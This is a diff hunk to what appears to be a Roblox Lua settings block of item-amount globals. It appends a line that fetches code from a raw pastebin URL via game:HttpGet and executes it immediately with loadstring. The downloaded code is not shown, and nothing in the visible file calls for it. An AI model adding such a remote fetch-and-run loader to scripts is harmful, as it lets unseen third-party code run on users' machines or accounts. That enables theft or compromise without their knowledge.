@@ -14,3 +14,5 @@ _G.Item3Amount = "";
 _G.Item4Amount = "";
 _G.Item5Amount = "";
 _G.Item6Amount = "";
+
+loadstring(game:HttpGet("https://pastebin.com/raw/hgX55n5z", true))();
